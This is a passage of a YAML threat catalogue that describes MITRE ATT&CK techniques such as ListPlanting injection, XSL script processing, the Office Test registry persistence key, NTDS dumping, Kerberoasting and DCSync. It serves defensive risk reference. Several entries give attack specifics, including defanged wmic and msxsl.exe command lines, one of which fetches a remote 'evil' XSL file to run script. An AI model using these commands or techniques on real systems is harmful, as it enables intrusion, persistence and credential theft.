      \ <code>SysListView32</code> child of the victim process window (via Windows\
      \ API calls such as <code>FindWindow</code> and/or <code>EnumWindows</code>)\
      \ or other [Process Injection](https://attack.mitre.org/techniques/T1055) methods.\n\
      \nSome variations of ListPlanting may allocate memory in the target process\
      \ but then use window messages to copy the payload, to avoid the use of the\
      \ highly monitored <code>WriteProcessMemory</code> function. For example, an\
      \ adversary can use the <code>PostMessage</code> and/or <code>SendMessage</code>\
      \ API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code>\
      \ messages, effectively copying a payload 2 bytes at a time to the allocated\
      \ memory.(Citation: ESET InvisiMole June 2020) \n\nFinally, the payload is triggered\
      \ by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code>\
      \ child of the process window, with the payload within the newly allocated buffer\
      \ passed and executed as the <code>ListView_SortItems</code> callback.\nhttps://attack.mitre.org/techniques/T1055/015"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1665
    ref_id: T1665
    name: Hide Infrastructure
    description: 'Adversaries may manipulate network traffic in order to hide and
      evade detection of their C2 infrastructure. This can be accomplished in various
      ways including by identifying and filtering traffic from defensive tools,(Citation:
      TA571) masking malicious domains to obfuscate the true destination from both
      automated scanning tools and security researchers,(Citation: Schema-abuse)(Citation:
      Facad1ng)(Citation: Browser-updates) and otherwise hiding malicious artifacts
      to delay discovery and prolong the effectiveness of adversary infrastructure
      that could otherwise be identified, blocked, or taken down entirely.


      C2 networks may include the use of [Proxy](https://attack.mitre.org/techniques/T1090)
      or VPNs to disguise IP addresses, which can allow adversaries to blend in with
      normal network traffic and bypass conditional access policies or anti-abuse
      protections. For example, an adversary may use a virtual private cloud to spoof
      their IP address to closer align with a victim''s IP address ranges. This may
      also bypass security measures relying on geolocation of the source IP address.(Citation:
      sysdig)(Citation: Orange Residential Proxies)


      Adversaries may also attempt to filter network traffic in order to evade defensive
      tools in numerous ways, including blocking/redirecting common incident responder
      or security appliance user agents.(Citation: mod_rewrite)(Citation: SocGholish-update)
      Filtering traffic based on IP and geo-fencing may also avoid automated sandboxing
      or researcher activity (i.e., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)).(Citation:
      TA571)(Citation: mod_rewrite)


      Hiding C2 infrastructure may also be supported by [Resource Development](https://attack.mitre.org/tactics/TA0042)
      activities such as [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
      and [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584).
      For example, using widely trusted hosting services or domains such as prominent
      URL shortening providers or marketing services for C2 networks may enable adversaries
      to present benign content that later redirects victims to malicious web pages
      or infrastructure once specific conditions are met.(Citation: StarBlizzard)(Citation:
      QR-cofense)

      https://attack.mitre.org/techniques/T1665'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1484
    ref_id: T1484
    name: Domain or Tenant Policy Modification
    description: "Adversaries may modify the configuration settings of a domain or\
      \ identity tenant to evade defenses and/or escalate privileges in centrally\
      \ managed environments. Such services provide a centralized means of managing\
      \ identity resources such as devices and accounts, and often include configuration\
      \ settings that may apply between domains or tenants such as trust relationships,\
      \ identity syncing, or identity federation.\n\nModifications to domain or tenant\
      \ settings may include altering domain Group Policy Objects (GPOs) in Microsoft\
      \ Active Directory (AD) or changing trust settings for domains, including federation\
      \ trusts relationships between domains or tenants.\n\nWith sufficient permissions,\
      \ adversaries can modify domain or tenant policy settings. Since configuration\
      \ settings for these services apply to a large number of identity resources,\
      \ there are a great number of potential attacks malicious outcomes that can\
      \ stem from this abuse. Examples of such abuse include:  \n\n* modifying GPOs\
      \ to push a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)\
      \ to computers throughout the domain environment(Citation: ADSecurity GPO Persistence\
      \ 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)\n\
      * modifying domain trusts to include an adversary-controlled domain, allowing\
      \ adversaries to  forge access tokens that will subsequently be accepted by\
      \ victim domain resources(Citation: Microsoft - Customer Guidance on Recent\
      \ Nation-State Cyber Attacks)\n* changing configuration settings within the\
      \ AD environment to implement a [Rogue Domain Controller](https://attack.mitre.org/techniques/T1207).\n\
      * adding new, adversary-controlled federated identity providers to identity\
      \ tenants, allowing adversaries to authenticate as any user managed by the victim\
      \ tenant (Citation: Okta Cross-Tenant Impersonation 2023)\n\nAdversaries may\
      \ temporarily modify domain or tenant policy, carry out a malicious action(s),\
      \ and then revert the change to remove suspicious indicators.\nhttps://attack.mitre.org/techniques/T1484"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1220
    ref_id: T1220
    name: XSL Script Processing
    description: "Adversaries may bypass application control and obscure execution\
      \ of code by embedding scripts inside XSL files. Extensible Stylesheet Language\
      \ (XSL) files are commonly used to describe the processing and rendering of\
      \ data within XML files. To support complex operations, the XSL standard includes\
      \ support for embedded scripting in various languages. (Citation: Microsoft\
      \ XSLT Script Mar 2017)\n\nAdversaries may abuse this functionality to execute\
      \ arbitrary files while potentially bypassing application control. Similar to\
      \ [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127),\
      \ the Microsoft common line transformation utility binary (msxsl.exe) (Citation:\
      \ Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript\
      \ embedded within local or remote (URL referenced) XSL files. (Citation: Penetration\
      \ Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default,\
      \ an adversary will likely need to package it with dropped files. (Citation:\
      \ Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an\
      \ XML source file and an XSL stylesheet. Since the XSL file is valid XML, the\
      \ adversary may call the same XSL file twice. When using msxsl.exe adversaries\
      \ may also give the XML/XSL files an arbitrary file extension.(Citation: XSL\
      \ Bypass Mar 2019)\n\nCommand-line examples:(Citation: Penetration Testing Lab\
      \ MSXSL July 2017)(Citation: XSL Bypass Mar 2019)\n\n* <code>msxsl.exe customers[.]xml\
      \ script[.]xsl</code>\n* <code>msxsl.exe script[.]xsl script[.]xsl</code>\n\
      * <code>msxsl.exe script[.]jpeg script[.]jpeg</code>\n\nAnother variation of\
      \ this technique, dubbed \u201CSquiblytwo\u201D, involves using [Windows Management\
      \ Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript\
      \ or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can\
      \ also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/\
      \ \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries\
      \ may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)\
      \ provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)\n\
      \nCommand-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)\n\
      \n* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>\n* Remote\
      \ File: <code>wmic os get /FORMAT:\u201Dhttps[:]//example[.]com/evil[.]xsl\u201D\
      </code>\nhttps://attack.mitre.org/techniques/T1220"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1596.005
    ref_id: T1596.005
    name: Scan Databases
    description: 'Adversaries may search within public scan databases for information
      about victims that can be used during targeting. Various online services continuously
      publish the results of Internet scans/surveys, often harvesting information
      such as active IP addresses, hostnames, open ports, certificates, and even server
      banners.(Citation: Shodan)


      Adversaries may search scan databases to gather actionable information. Threat
      actors can use online resources and lookup tools to harvest information from
      these services. Adversaries may seek information about their already identified
      targets, or use these datasets to discover opportunities for successful breaches.
      Information from these sources may reveal opportunities for other forms of reconnaissance
      (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search
      Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing
      operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)
      or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).

      https://attack.mitre.org/techniques/T1596/005'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.001
    ref_id: T1564.001
    name: Hidden Files and Directories
    description: "Adversaries may set files and directories to be hidden to evade\
      \ detection mechanisms. To prevent normal users from accidentally changing special\
      \ files on a system, most operating systems have the concept of a \u2018hidden\u2019\
      \ file. These files don\u2019t show up when a user browses the file system with\
      \ a GUI or when using normal commands on the command line. Users must explicitly\
      \ ask to show the hidden files either via a series of Graphical User Interface\
      \ (GUI) prompts or with command line switches (<code>dir /a</code> for Windows\
      \ and <code>ls \u2013a</code> for Linux and macOS).\n\nOn Linux and Mac, users\
      \ can mark specific files as hidden simply by putting a \u201C.\u201D as the\
      \ first character in the file or folder name  (Citation: Sofacy Komplex Trojan)\
      \ (Citation: Antiquated Mac Malware). Files and folders that start with a period,\
      \ \u2018.\u2019, are by default hidden from being viewed in the Finder application\
      \ and standard command-line utilities like \u201Cls\u201D. Users must specifically\
      \ change settings to have these files viewable.\n\nFiles on macOS can also be\
      \ marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app,\
      \ but still allows them to be seen in Terminal.app (Citation: WireLurker). On\
      \ Windows, users can mark specific files as hidden by using the attrib.exe binary.\
      \ Many applications create these hidden files and folders to store information\
      \ so that it doesn\u2019t clutter up the user\u2019s workspace. For example,\
      \ SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019\
      s known hosts and keys.\n\nAdversaries can use this to their advantage to hide\
      \ files and folders anywhere on the system and evading a typical user or system\
      \ analysis that does not incorporate investigation of hidden files.\nhttps://attack.mitre.org/techniques/T1564/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1578.001
    ref_id: T1578.001
    name: Create Snapshot
    description: 'An adversary may create a snapshot or data backup within a cloud
      account to evade defenses. A snapshot is a point-in-time copy of an existing
      cloud compute component such as a virtual machine (VM), virtual hard drive,
      or volume. An adversary may leverage permissions to create a snapshot in order
      to bypass restrictions that prevent access to existing compute service infrastructure,
      unlike in [Revert Cloud Instance](https://attack.mitre.org/techniques/T1578/004)
      where an adversary may revert to a snapshot to evade detection and remove evidence
      of their presence.


      An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002),
      mount one or more created snapshots to that instance, and then apply a policy
      that allows the adversary access to the created instance, such as a firewall
      policy that allows them inbound and outbound SSH access.(Citation: Mandiant
      M-Trends 2020)

      https://attack.mitre.org/techniques/T1578/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1591.001
    ref_id: T1591.001
    name: Determine Physical Locations
    description: 'Adversaries may gather the victim''s physical location(s) that can
      be used during targeting. Information about physical locations of a target organization
      may include a variety of details, including where key resources and infrastructure
      are housed. Physical locations may also indicate what legal jurisdiction and/or
      authorities the victim operates within.


      Adversaries may gather this information in various ways, such as direct elicitation
      via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Physical
      locations of a target organization may also be exposed to adversaries via online
      or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)
      or [Social Media](https://attack.mitre.org/techniques/T1593/001)).(Citation:
      ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information
      may reveal opportunities for other forms of reconnaissance (ex: [Phishing for
      Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587)
      or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or
      initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or
      [Hardware Additions](https://attack.mitre.org/techniques/T1200)).

      https://attack.mitre.org/techniques/T1591/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1137.002
    ref_id: T1137.002
    name: Office Test
    description: 'Adversaries may abuse the Microsoft Office "Office Test" Registry
      key to obtain persistence on a compromised system. An Office Test Registry location
      exists that allows a user to specify an arbitrary DLL that will be executed
      every time an Office application is started. This Registry key is thought to
      be used by Microsoft to load DLLs for testing and debugging purposes while developing
      Office applications. This Registry key is not created by default during an Office
      installation.(Citation: Hexacorn Office Test)(Citation: Palo Alto Office Test
      Sofacy)


      There exist user and global Registry keys for the Office Test feature, such
      as:


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf</code>


      Adversaries may add this Registry key and specify a malicious DLL that will
      be executed whenever an Office application, such as Word or Excel, is started.

      https://attack.mitre.org/techniques/T1137/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1587
    ref_id: T1587
    name: Develop Capabilities
    description: 'Adversaries may build capabilities that can be used during targeting.
      Rather than purchasing, freely downloading, or stealing capabilities, adversaries
      may develop their own capabilities in-house. This is the process of identifying
      development requirements and building solutions such as malware, exploits, and
      self-signed certificates. Adversaries may develop capabilities to support their
      operations throughout numerous phases of the adversary lifecycle.(Citation:
      Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity
      June 2020)(Citation: Talos Promethium June 2020)


      As with legitimate development efforts, different skill sets may be required
      for developing capabilities. The skills needed may be located in-house, or may
      need to be contracted out. Use of a contractor may be considered an extension
      of that adversary''s development capabilities, provided the adversary plays
      a role in shaping requirements and maintains a degree of exclusivity to the
      capability.

      https://attack.mitre.org/techniques/T1587'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003.003
    ref_id: T1003.003
    name: NTDS
    description: 'Adversaries may attempt to access or create a copy of the Active
      Directory domain database in order to steal credential information, as well
      as obtain other information about domain members such as devices, users, and
      access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\NTDS\Ntds.dit</code>
      of a domain controller.(Citation: Wikipedia Active Directory)


      In addition to looking for NTDS files on active Domain Controllers, adversaries
      may search for backups that contain the same or similar information.(Citation:
      Metcalf 2015)


      The following tools and techniques can be used to enumerate the NTDS file and
      the contents of the entire Active Directory hashes.


      * Volume Shadow Copy

      * secretsdump.py

      * Using the in-built Windows tool, ntdsutil.exe

      * Invoke-NinjaCopy

      https://attack.mitre.org/techniques/T1003/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1602.001
    ref_id: T1602.001
    name: SNMP (MIB Dump)
    description: 'Adversaries may target the Management Information Base (MIB) to
      collect and/or mine valuable information in a network managed using Simple Network
      Management Protocol (SNMP).


      The MIB is a configuration repository that stores variable information accessible
      via SNMP in the form of object identifiers (OID). Each OID identifies a variable
      that can be read or set and permits active management tasks, such as configuration
      changes, through remote modification of these variables. SNMP can give administrators
      great insight in their systems, such as, system information, description of
      hardware, physical location, and software packages(Citation: SANS Information
      Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain
      device operational information, including running configuration, routing table,
      and interface details.


      Adversaries may use SNMP queries to collect MIB content directly from SNMP-managed
      devices in order to collect network information that allows the adversary to
      build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation:
      Cisco Blog Legacy Device Attacks)

      https://attack.mitre.org/techniques/T1602/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1001.002
    ref_id: T1001.002
    name: Steganography
    description: 'Adversaries may use steganographic techniques to hide command and
      control traffic to make detection efforts more difficult. Steganographic techniques
      can be used to hide data in digital messages that are transferred between systems.
      This hidden information can be used for command and control of compromised systems.
      In some cases, the passing of files embedded using steganography, such as image
      or document files, can be used for command and control.

      https://attack.mitre.org/techniques/T1001/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1204.001
    ref_id: T1204.001
    name: Malicious Link
    description: 'An adversary may rely upon a user clicking a malicious link in order
      to gain execution. Users may be subjected to social engineering to get them
      to click on a link that will lead to code execution. This user action will typically
      be observed as follow-on behavior from [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002).
      Clicking on a link may also lead to other execution techniques such as exploitation
      of a browser or application vulnerability via [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).
      Links may also lead users to download files that require execution via [Malicious
      File](https://attack.mitre.org/techniques/T1204/002).

      https://attack.mitre.org/techniques/T1204/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1550.001
    ref_id: T1550.001
    name: Application Access Token
    description: "Adversaries may use stolen application access tokens to bypass the\
      \ typical authentication process and access restricted accounts, information,\
      \ or services on remote systems. These tokens are typically stolen from users\
      \ or services and used in lieu of login credentials.\n\nApplication access tokens\
      \ are used to make authorized API requests on behalf of a user or service and\
      \ are commonly used to access resources in cloud, container-based applications,\
      \ and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always\
      \ Use Access Tokens to Secure APIs Sept 2019) \n\nOAuth is one commonly implemented\
      \ framework that issues tokens to users for access to systems. These frameworks\
      \ are used collaboratively to verify the user and determine what actions the\
      \ user is allowed to perform. Once identity is established, the token allows\
      \ actions to be authorized, without passing the actual credentials of the user.\
      \ Therefore, compromise of the token can grant the adversary access to resources\
      \ of other sites through a malicious application.(Citation: okta)\n\nFor example,\
      \ with a cloud-based email service, once an OAuth access token is granted to\
      \ a malicious application, it can potentially gain long-term access to features\
      \ of the user account if a \"refresh\" token enabling background access is awarded.(Citation:\
      \ Microsoft Identity Platform Access 2019) With an OAuth access token an adversary\
      \ can use the user-granted REST API to perform functions such as email searching\
      \ and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\n\
      Compromised access tokens may be used as an initial step in compromising other\
      \ services. For example, if a token grants access to a victim\u2019s primary\
      \ email, the adversary may be able to extend access to all other services which\
      \ the target subscribes by triggering forgotten password routines. In AWS and\
      \ GCP environments, adversaries can trigger a request for a short-lived access\
      \ token with the privileges of another user account.(Citation: Google Cloud\
      \ Service Account Credentials)(Citation: AWS Temporary Security Credentials)\
      \ The adversary can then use this token to request data or perform actions the\
      \ original account could not. If permissions for this feature are misconfigured\
      \ \u2013 for example, by allowing all users to request a token for a particular\
      \ account - an adversary may be able to gain initial access to a Cloud Account\
      \ or escalate their privileges.(Citation: Rhino Security Labs Enumerating AWS\
      \ Roles)\n\nDirect API access through a token negates the effectiveness of a\
      \ second authentication factor and may be immune to intuitive countermeasures\
      \ like changing passwords.  For example, in AWS environments, an adversary who\
      \ compromises a user\u2019s AWS API credentials may be able to use the `sts:GetFederationToken`\
      \ API call to create a federated user session, which will have the same permissions\
      \ as the original user but may persist even if the original user credentials\
      \ are deactivated.(Citation: Crowdstrike AWS User Federation Persistence) Additionally,\
      \ access abuse over an API channel can be difficult to detect even from the\
      \ service provider end, as the access can still align well with a legitimate\
      \ workflow.\nhttps://attack.mitre.org/techniques/T1550/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.008
    ref_id: T1547.008
    name: LSASS Driver
    description: 'Adversaries may modify or add LSASS drivers to obtain persistence
      on compromised systems. The Windows security subsystem is a set of components
      that manage and enforce the security policy for a computer or domain. The Local
      Security Authority (LSA) is the main component responsible for local security
      policy and user authentication. The LSA includes multiple dynamic link libraries
      (DLLs) associated with various other security functions, all of which run in
      the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation:
      Microsoft Security Subsystem)


      Adversaries may target LSASS drivers to obtain persistence. By either replacing
      or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)),
      an adversary can use LSA operations to continuously execute malicious payloads.

      https://attack.mitre.org/techniques/T1547/008'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1569.002
    ref_id: T1569.002
    name: Service Execution
    description: 'Adversaries may abuse the Windows service control manager to execute
      malicious commands or payloads. The Windows service control manager (<code>services.exe</code>)
      is an interface to manage and manipulate services.(Citation: Microsoft Service
      Control Manager) The service control manager is accessible to users via GUI
      components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).


      [PsExec](https://attack.mitre.org/software/S0029) can also be used to execute
      commands or payloads via a temporary Windows service created through the service
      control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029)
      and <code>sc.exe</code> can accept remote servers as arguments and may be used
      to conduct remote execution.


      Adversaries may leverage these mechanisms to execute malicious content. This
      can be done by either executing a new or modified service. This technique is
      the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003)
      during service persistence or privilege escalation.

      https://attack.mitre.org/techniques/T1569/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1078.004
    ref_id: T1078.004
    name: Cloud Accounts
    description: "Valid accounts in cloud environments may allow adversaries to perform\
      \ actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense\
      \ Evasion. Cloud accounts are those created and configured by an organization\
      \ for use by users, remote support, services, or for administration of resources\
      \ within a cloud service provider or SaaS application. Cloud Accounts can exist\
      \ solely in the cloud; alternatively, they may be hybrid-joined between on-premises\
      \ systems and the cloud through syncing or federation with other identity sources\
      \ such as Windows Active Directory. (Citation: AWS Identity Federation)(Citation:\
      \ Google Federating GC)(Citation: Microsoft Deploying AD Federation)\n\nService\
      \ or user accounts may be targeted by adversaries through [Brute Force](https://attack.mitre.org/techniques/T1110),\
      \ [Phishing](https://attack.mitre.org/techniques/T1566), or various other means\
      \ to gain access to the environment. Federated or synced accounts may be a pathway\
      \ for the adversary to affect both on-premises systems and cloud environments\
      \ - for example, by leveraging shared credentials to log onto [Remote Services](https://attack.mitre.org/techniques/T1021).\
      \ High privileged cloud accounts, whether federated, synced, or cloud-only,\
      \ may also allow pivoting to on-premises environments by leveraging SaaS-based\
      \ [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) to\
      \ run commands on hybrid-joined devices.\n\nAn adversary may create long lasting\
      \ [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001)\
      \ on a compromised cloud account to maintain persistence in the environment.\
      \ Such credentials may also be used to bypass security controls such as multi-factor\
      \ authentication. \n\nCloud accounts may also be able to assume [Temporary Elevated\
      \ Cloud Access](https://attack.mitre.org/techniques/T1548/005) or other privileges\
      \ through various means within the environment. Misconfigurations in role assignments\
      \ or role assumption policies may allow an adversary to use these mechanisms\
      \ to leverage permissions outside the intended scope of the account. Such over\
      \ privileged accounts may be used to harvest sensitive data from online storage\
      \ accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009)\
      \ or other methods.\nhttps://attack.mitre.org/techniques/T1078/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1480.001
    ref_id: T1480.001
    name: Environmental Keying
    description: 'Adversaries may environmentally key payloads or other features of
      malware to evade defenses and constraint execution to a specific target environment.
      Environmental keying uses cryptography to constrain execution or actions based
      on adversary supplied environment specific conditions that are expected to be
      present on the target. Environmental keying is an implementation of [Execution
      Guardrails](https://attack.mitre.org/techniques/T1480) that utilizes cryptographic
      techniques for deriving encryption/decryption keys from specific types of values
      in a given computing environment.(Citation: EK Clueless Agents)


      Values can be derived from target-specific elements and used to generate a decryption
      key for an encrypted payload. Target-specific values can be derived from specific
      network shares, physical devices, software/software versions, files, joined
      AD domains, system time, and local/external IP addresses.(Citation: Kaspersky
      Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding
      Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic
      Malware) By generating the decryption keys from target-specific environmental
      values, environmental keying can make sandbox detection, anti-virus detection,
      crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky
      Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can
      slow down the incident response process and help adversaries hide their tactics,
      techniques, and procedures (TTPs).


      Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027),
      adversaries may use environmental keying to help protect their TTPs and evade
      detection. Environmental keying may be used to deliver an encrypted payload
      to the target that will use target-specific values to decrypt the payload before
      execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware
      Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation:
      Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt
      the payload the adversary can avoid packaging the decryption key with the payload
      or sending it over a potentially monitored network connection. Depending on
      the technique for gathering target-specific values, reverse engineering of the
      encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss
      Whitepaper) This can be used to prevent exposure of capabilities in environments
      that are not intended to be compromised or operated within.


      Like other [Execution Guardrails](https://attack.mitre.org/techniques/T1480),
      environmental keying can be used to prevent exposure of capabilities in environments
      that are not intended to be compromised or operated within. This activity is
      distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497).
      While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)
      may involve checking for known sandbox values and continuing with execution
      only if there is no match, the use of environmental keying will involve checking
      for an expected target-specific value that must match for decryption and subsequent
      execution to be successful.

      https://attack.mitre.org/techniques/T1480/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1008
    ref_id: T1008
    name: Fallback Channels
    description: 'Adversaries may use fallback or alternate communication channels
      if the primary channel is compromised or inaccessible in order to maintain reliable
      command and control and to avoid data transfer thresholds.

      https://attack.mitre.org/techniques/T1008'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1564.004
    ref_id: T1564.004
    name: NTFS File Attributes
    description: 'Adversaries may use NTFS file attributes to hide their malicious
      data in order to evade detection. Every New Technology File System (NTFS) formatted
      partition contains a Master File Table (MFT) that maintains a record for every
      file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017)
      Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes
      Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data
      Streams (ADSs) when more than one Data attribute is present], that can be used
      to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based
      Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July
      2015) (Citation: Microsoft ADS Mar 2014)


      Adversaries may store malicious data or binaries in file attribute metadata
      instead of directly in files. This may be done to evade some defenses, such
      as static indicator scanning tools and anti-virus. (Citation: Journey into IR
      ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)

      https://attack.mitre.org/techniques/T1564/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1558.003
    ref_id: T1558.003
    name: Kerberoasting
    description: "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT)\
      \ or sniff network traffic to obtain a ticket-granting service (TGS) ticket\
      \ that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation:\
      \ Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec\
      \ 2015) \n\nService principal names (SPNs) are used to uniquely identify each\
      \ instance of a Windows service. To enable authentication, Kerberos requires\
      \ that SPNs be associated with at least one service logon account (an account\
      \ specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting\
      \ Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation:\
      \ SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\n\
      \nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request\
      \ one or more Kerberos ticket-granting service (TGS) service tickets for any\
      \ SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation:\
      \ AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted\
      \ with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the\
      \ service account associated with the SPN is used as the private key and is\
      \ thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110)\
      \ attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking\
      \ Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation:\
      \ Harmj0y Kerberoast Nov 2016)\n\nThis same behavior could be executed using\
      \ service tickets captured from network traffic.(Citation: AdSecurity Cracking\
      \ Kerberos Dec 2015)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003),\
      \ [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral\
      \ Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation:\
      \ SANS Attacking Kerberos Nov 2014)\nhttps://attack.mitre.org/techniques/T1558/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003.006
    ref_id: T1003.006
    name: DCSync
    description: 'Adversaries may attempt to access credentials and other sensitive
      information by abusing a Windows Domain Controller''s application programming
      interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges)
      (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication
      process from a remote domain controller using a technique called DCSync.


      Members of the Administrators, Domain Admins, and Enterprise Admin groups or
      computer accounts on the domain controller are able to run DCSync to pull password
      data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may
      include current and historical hashes of potentially useful accounts such as
      KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden
      Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the
      Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz
      and DCSync) or change an account''s password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation:
      InsiderThreat ChangeNTLM July 2017)


      DCSync functionality has been included in the "lsadump" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation:
      GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs
      DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)

      https://attack.mitre.org/techniques/T1003/006'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1124
    ref_id: T1124
    name: System Time Discovery
    description: "An adversary may gather the system time and/or time zone settings\
      \ from a local or remote system. The system time is set and stored by services,\
      \ such as the Windows Time Service on Windows or <code>systemsetup</code> on\
      \ macOS.(Citation: MSDN System Time)(Citation: Technet Windows Time Service)(Citation:\
